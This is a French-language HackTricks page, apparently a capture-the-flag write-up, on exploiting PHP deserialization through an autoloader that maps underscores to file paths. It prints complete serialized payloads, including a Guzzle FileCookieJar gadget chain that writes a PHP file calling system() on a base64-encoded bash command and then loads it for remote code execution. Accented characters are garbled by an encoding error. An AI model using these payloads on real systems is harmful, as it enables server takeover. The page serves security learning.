# PHP - D√©s√©rialisation + Classes d'autoload

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Tout d'abord, vous devez v√©rifier ce que sont les [**Classes d'autoload**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP d√©s√©rialisation + spl\_autoload\_register + LFI/Gadget

Nous sommes dans une situation o√π nous avons trouv√© une **d√©s√©rialisation PHP dans une application web** sans biblioth√®que vuln√©rable aux gadgets √† l'int√©rieur de **`phpggc`**. Cependant, dans le m√™me conteneur, il y avait une **autre application web de compositeur avec des biblioth√®ques vuln√©rables**. Par cons√©quent, l'objectif √©tait de **charger le chargeur de compositeur de l'autre application web** et de l'exploiter pour **charger un gadget qui exploitera cette biblioth√®que avec un gadget** de l'application web vuln√©rable √† la d√©s√©rialisation.

√âtapes :

* Vous avez trouv√© une **d√©s√©rialisation** et il n'y a **pas de gadget** dans le code de l'application actuelle
* Vous pouvez abuser d'une fonction **`spl_autoload_register`** comme celle-ci pour **charger n'importe quel fichier local avec l'extension `.php`**
  * Pour cela, vous utilisez une d√©s√©rialisation o√π le nom de la classe va √™tre √† l'int√©rieur de **`$name`**. Vous **ne pouvez pas utiliser "/" ou "."** dans un nom de classe dans un objet s√©rialis√©, mais le **code** est en train de **remplacer** les **traits de soulignement** ("\_") **par des barres obliques** ("/"). Ainsi, un nom de classe tel que `tmp_passwd` sera transform√© en `/tmp/passwd.php` et le code essaiera de le charger.\
    Un **exemple de gadget** sera : **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

   if (preg_match('/Controller$/', $name)) {
       $name = "controllers/${name}";
   } elseif (preg_match('/Model$/', $name)) {
       $name = "models/${name}";
   } elseif (preg_match('/_/', $name)) {
       $name = preg_replace('/_/', '/', $name);
   }

   $filename = "/${name}.php";

   if (file_exists($filename)) {
       require $filename;
   }
   elseif (file_exists(__DIR__ . $filename)) {
       require __DIR__ . $filename;
   }
});
```
{% hint style="success" %}
Si vous avez un **t√©l√©chargement de fichier** et que vous pouvez t√©l√©charger un fichier avec l'extension **`.php`**, vous pouvez **exploiter directement cette fonctionnalit√©** et obtenir d√©j√† une RCE.
{% endhint %}

Dans mon cas, je n'avais rien de tel, mais il y avait √† l'int√©rieur du **m√™me conteneur** une autre page web de compositeur avec une **biblioth√®que vuln√©rable √† un gadget `phpggc`**.

* Pour charger cette autre biblioth√®que, vous devez d'abord **charger le chargeur de compositeur de cette autre application web** (parce que celui de l'application actuelle n'acc√©dera pas aux biblioth√®ques de l'autre). **En connaissant le chemin de l'application**, vous pouvez y parvenir tr√®s facilement avec: **`O:28:"www_frontend_vendor_autoload":0:{}`** (Dans mon cas, le chargeur de compositeur √©tait dans `/www/frontend/vendor/autoload.php`)
* Maintenant, vous pouvez **charger** les autres **chargeurs de compositeur de l'application**, il est donc temps de **`g√©n√©rer la charge utile phpgcc`** √† utiliser. Dans mon cas, j'ai utilis√© **`Guzzle/FW1`**, ce qui m'a permis d'**√©crire n'importe quel fichier dans le syst√®me de fichiers**.
  * REMARQUE: Le **gadget g√©n√©r√© ne fonctionnait pas**, pour qu'il fonctionne, j'ai **modifi√©** cette charge utile **`chain.php`** de phpggc et j'ai d√©fini **tous les attributs** des classes **de priv√© √† public**. Sinon, apr√®s la d√©s√©rialisation de la cha√Æne, les attributs des objets cr√©√©s n'avaient aucune valeur.
* Maintenant, nous avons le moyen de **charger les autres chargeurs de compositeur de l'application** et d'avoir une **charge utile phpggc qui fonctionne**, mais nous devons **le faire dans la M√äME REQU√äTE pour que le chargeur soit charg√© lorsque le gadget est utilis√©**. Pour cela, j'ai envoy√© un tableau s√©rialis√© avec les deux objets comme suit:
  * Vous pouvez voir **d'abord le chargeur charg√©, puis la charge utile**. 

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* Maintenant, nous pouvons **cr√©er et √©crire un fichier**, cependant, l'utilisateur **ne pouvait pas √©crire dans n'importe quel dossier √† l'int√©rieur du serveur web**. Ainsi, comme vous pouvez le voir dans la charge utile, PHP appelle **`system`** avec du **base64** qui est cr√©√© dans **`/tmp/a.php`**. Ensuite, nous pouvons **r√©utiliser le premier type de charge utile** que nous avons utilis√© pour LFI pour charger le chargeur de compositeur de l'autre application web **pour charger le fichier `/tmp/a.php`** g√©n√©r√©. Il suffit de l'ajouter au gadget de d√©s√©rialisation:&#x20;

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**R√©sum√© de la charge utile**

* **Charger l'autoloader de composer** d'une autre application web dans le m√™me conteneur
* **Charger un gadget phpggc** pour abuser d'une biblioth√®que de l'autre application web (l'application web initiale vuln√©rable √† la d√©s√©rialisation n'avait aucun gadget sur ses biblioth√®ques)
* Le gadget va **cr√©er un fichier avec une charge utile PHP** dedans dans /tmp/a.php avec des commandes malveillantes (l'utilisateur de l'application web ne peut pas √©crire dans n'importe quel dossier de n'importe quelle application web)
* La derni√®re partie de notre charge utile va **charger le fichier php g√©n√©r√©** qui ex√©cutera des commandes

J'ai d√ª **appeler cette d√©s√©rialisation deux fois**. Dans mes tests, la premi√®re fois, le fichier `/tmp/a.php` a √©t√© cr√©√© mais pas charg√©, et la deuxi√®me fois, il a √©t√© correctement charg√©.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
